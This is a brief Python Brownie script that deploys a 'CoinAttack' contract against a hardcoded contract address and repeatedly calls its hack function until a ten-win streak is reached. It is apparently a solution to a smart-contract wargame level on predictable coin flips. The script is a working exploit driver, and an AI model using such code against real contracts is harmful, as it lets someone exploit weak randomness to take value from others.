from scripts.helpful_scripts import get_account
from brownie import CoinAttack


def main():
    account = get_account()
    attack = CoinAttack.deploy(
        "0x9bEa0ECaa0DE2A8e5Cb871Db4557a9e769C58EE2", {"from": account}
    )

    while attack.winStreak() < 10:
        try:
            tx = attack.hack({"from": account})
            tx.wait(5)
            print(f"Current win streak: [{attack.winStreak()}]")
        except:
            pass
